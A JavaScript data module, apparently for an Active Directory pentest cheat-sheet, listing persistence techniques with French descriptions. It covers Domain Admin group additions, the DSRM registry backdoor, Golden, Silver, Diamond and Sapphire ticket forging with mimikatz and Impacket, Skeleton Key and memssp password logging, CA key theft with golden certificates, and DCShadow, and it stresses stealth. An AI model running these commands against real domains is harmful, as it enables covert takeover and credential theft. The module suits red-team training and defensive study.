export const PERSISTENCE_DATA = [
  {
    name: 'Privileged Groups & DSRM',
    nodes: [
      { 
        label: 'Add Domain Admin', 
        cmd: 'net group "domain admins" <user> /add /domain', 
        leadsTo: 'Persistence (Admin)',
        description: 'Méthode directe consistant à ajouter un utilisateur contrôlé au groupe des administrateurs du domaine. Très bruyant.'
      },
      { 
        label: 'DSRM Admin Behavior', 
        cmd: 'PowerShell New-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD', 
        leadsTo: 'Local Admin Persist',
        description: 'Modifie le comportement du compte DSRM (Directory Service Restore Mode) pour permettre l\'authentification réseau, offrant un accès "backdoor" sur le DC.'
      }
    ]
  },
  {
    name: 'Golden & Silver Tickets',
    nodes: [
      { 
        label: 'Golden Ticket (Mimikatz)', 
        cmd: 'mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain_sid> /aes256:<krbtgt_key> /ptt"', 
        leadsTo: 'Domain Admin',
        description: 'Forge un Ticket Granting Ticket (TGT) arbitraire en utilisant la clé du compte KRBTGT. Permet de devenir n\'importe qui, n\'importe quand.'
      },
      { 
        label: 'Silver Ticket (Mimikatz)', 
        cmd: 'mimikatz "kerberos::golden /user:<any_user> /domain:<domain> /sid:<sid> /target:<server> /service:<service> /aes256:<key> /ptt"', 
        leadsTo: 'Service Access',
        description: 'Forge un ticket de service (TGS) pour un service spécifique (ex: CIFS, LDAP) en utilisant la clé du compte machine cible.'
      },
      { 
        label: 'Golden Ticket (Ticketer)', 
        cmd: 'ticketer.py -aesKey <aeskey> -domain-sid <sid> -domain <domain> <any_user>', 
        leadsTo: 'TGT File (ccache)',
        description: 'Version Impacket pour forger un ticket d\'or hors-ligne sous forme de fichier.'
      }
    ]
  },
  {
    name: 'Advanced Kerberos (Diamond & Sapphire)',
    nodes: [
      { 
        label: 'Diamond Ticket', 
        cmd: 'ticketer.py -request -domain <domain> -user <user> -password <pass> -aeskey <krbtgt_key> <target_user>', 
        leadsTo: 'Domain Admin',
        description: 'Demande un TGT légitime puis le modifie pour ajouter des privilèges (PAC). Plus discret qu\'un Golden Ticket car le ticket possède un numéro de série valide.'
      },
      { 
        label: 'Sapphire Ticket', 
        cmd: 'ticketer.py -request-impersonate <target_user> -domain <domain> -user <user> -aesKey <krbtgt_key>', 
        leadsTo: 'Domain Admin',
        description: 'Technique ultime consistant à obtenir un ticket pour un utilisateur en impersonnant son flux d\'authentification via la clé KRBTGT.'
      }
    ]
  },
  {
    name: 'Malicious SSP & Skeleton Key',
    nodes: [
      { 
        label: 'Skeleton Key', 
        cmd: 'mimikatz "privilege::debug" "misc::skeleton" exit', 
        leadsTo: 'Master Password',
        description: 'Injecte un "mot de passe maître" (par défaut: mimikatz) en mémoire du DC. Tous les utilisateurs peuvent alors s\'authentifier avec leur vrai mot de passe OU le skeleton key.'
      },
      { 
        label: 'Custom SSP (Memssp)', 
        cmd: 'mimikatz "privilege::debug" "misc::memssp" exit', 
        leadsTo: 'Password Logging',
        description: 'Injecte un Security Support Provider malveillant en mémoire pour loguer tous les mots de passe saisis sur la machine dans C:\\Windows\\System32\\kiwissp.log.'
      }
    ]
  },
  {
    name: 'ADCS Persistence (Golden Certificate)',
    nodes: [
      { 
        label: 'CA Backup', 
        cmd: 'certipy ca-backup -ca <ca_name> -username <user> -hashes <hash>', 
        leadsTo: 'CA Private Key',
        description: 'Exfiltre la clé privée et le certificat de l\'Autorité de Certification (CA).'
      },
      { 
        label: 'Golden Certificate Forge', 
        cmd: 'certipy forge -ca-pfx <ca_key.pfx> -upn <admin>@<domain> -subject "CN=Admin,CN=Users,DC=..."', 
        leadsTo: 'Admin Certificate',
        description: 'Forge un certificat arbitraire pour n\'importe quel utilisateur en utilisant la clé de la CA volée. Persistance quasi-indétectable.'
      }
    ]
  },
  {
    name: 'Directory Objects',
    nodes: [
      { 
        label: 'DCShadow', 
        cmd: 'mimikatz "lsadump::dcshadow /object:CN=User... /attribute:sidHistory /value:..."', 
        leadsTo: 'AD Manipulation',
        description: 'Enregistre temporairement une machine comme un DC pour pousser des modifications d\'attributs (ex: SID History) sans générer de logs sur les vrais DC.'
      }
    ]
  }
];